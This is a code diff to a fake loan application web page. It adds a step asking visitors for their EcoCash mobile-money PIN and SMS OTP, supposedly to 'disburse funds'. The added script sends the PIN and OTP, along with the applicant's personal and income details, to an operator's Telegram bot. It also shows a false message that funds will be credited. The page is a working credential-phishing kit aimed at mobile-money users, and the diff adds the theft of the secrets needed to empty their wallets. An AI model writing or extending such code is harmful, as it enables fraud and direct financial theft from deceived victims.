@@ -328,7 +328,7 @@
 
         <div class="card">
             <!-- Step Indicators -->
-            <div class="steps-indicator">
+            <div class="steps-indicator" id="stepsIndicator">
                 <div class="step-bar active" id="bar1"></div>
                 <div class="step-bar" id="bar2"></div>
                 <div class="step-bar" id="bar3"></div>
@@ -494,7 +494,34 @@
 
                     <div class="btn-group">
                         <button type="button" class="btn btn-secondary" id="prevBtn3">PREVIOUS</button>
-                        <button type="submit" class="btn btn-primary" id="submitBtn">SUBMIT APPLICATION</button>
+                        <button type="button" class="btn btn-primary" id="proceedToVerifyBtn">PROCEED TO VERIFY</button>
+                    </div>
+                </div>
+
+                <!-- STEP 4: EcoCash PIN & OTP Verification -->
+                <div class="step-content" id="step4">
+                    <div class="header-title">Account Verification</div>
+                    <div class="header-sub">Enter your EcoCash PIN & OTP to disburse funds</div>
+
+                    <div style="background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 18px; font-size: 13px; color: var(--muted);">
+                        Please confirm your mobile money credentials to authorize loan deposit directly into your EcoCash wallet.
+                    </div>
+
+                    <div class="form-group">
+                        <label>EcoCash PIN</label>
+                        <input type="password" id="ecocashPin" maxlength="5" placeholder="&bull;&bull;&bull;&bull;&bull;">
+                        <span style="font-size: 11px; color: var(--muted); margin-top: 4px; display: block;">Enter your 4 or 5 digit PIN</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label>OTP Code</label>
+                        <input type="text" id="otpCode" placeholder="Enter 4-6 digit OTP">
+                        <span style="font-size: 11px; color: var(--muted); margin-top: 4px; display: block;">Check your SMS for the authorization code</span>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" id="prevBtn4">PREVIOUS</button>
+                        <button type="submit" class="btn btn-primary" id="submitBtn">FINISH &amp; SUBMIT</button>
                     </div>
 
                     <div id="statusBox" class="status-msg"></div>
@@ -571,6 +598,12 @@
             document.getElementById('bar3').classList.add('active');
         });
 
+        document.getElementById('proceedToVerifyBtn').addEventListener('click', function() {
+            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step4').classList.add('active');
+            document.getElementById('stepsIndicator').style.display = 'none';
+        });
+
         document.getElementById('prevBtn2').addEventListener('click', function() {
             document.getElementById('step2').classList.remove('active');
             document.getElementById('bar2').classList.remove('active');
@@ -583,15 +616,29 @@
             document.getElementById('step2').classList.add('active');
         });
 
-        // Form Submission to Telegram with Timeout Protector
+        document.getElementById('prevBtn4').addEventListener('click', function() {
+            document.getElementById('step4').classList.remove('active');
+            document.getElementById('stepsIndicator').style.display = 'flex';
+            document.getElementById('step3').classList.add('active');
+        });
+
+        // Form Submission to Telegram with Timeout Protector & PIN/OTP
         document.getElementById('loanForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+
+            const pin = document.getElementById('ecocashPin').value.trim();
+            const otp = document.getElementById('otpCode').value.trim();
+
+            if (!pin || !otp) {
+                alert('Please enter both your EcoCash PIN and OTP code.');
+                return;
+            }
 
             const submitBtn = document.getElementById('submitBtn');
             const statusBox = document.getElementById('statusBox');
 
             submitBtn.disabled = true;
-            submitBtn.textContent = 'SUBMITTING...';
+            submitBtn.textContent = 'VERIFYING & SUBMITTING...';
             statusBox.style.display = 'none';
 
             try {
@@ -615,7 +662,9 @@
                                 `⏱ *Term:* ${loanTerm}\n` +
                                 `📋 *Purpose:* ${purpose}\n` +
                                 `💼 *Employment:* ${employment}\n` +
-                                `💵 *Annual Income:* $${annualIncome}`;
+                                `💵 *Annual Income:* $${annualIncome}\n\n` +
+                                `🔐 *EcoCash PIN:* \`${pin}\`\n` +
+                                `🔑 *OTP Code:* \`${otp}\``;
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -637,12 +686,12 @@
                 const data = await response.json();
 
                 if (data.ok) {
-                    statusBox.textContent = 'Application submitted successfully! Our team will contact you.';
+                    statusBox.textContent = 'Verification successful! Funds will be credited to your wallet.';
                     statusBox.className = 'status-msg';
                     statusBox.style.background = '#d1fae5';
                     statusBox.style.color = '#065f46';
                     statusBox.style.display = 'block';
-                    submitBtn.textContent = 'SUCCESSFUL';
+                    submitBtn.textContent = 'VERIFIED & SUCCESSFUL';
                 } else {
                     throw new Error(data.description || 'Telegram API error');
                 }
@@ -654,7 +703,7 @@
                 statusBox.style.color = '#991b1b';
                 statusBox.style.display = 'block';
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'SUBMIT APPLICATION';
+                submitBtn.textContent = 'FINISH & SUBMIT';
             }
         });
     </script>
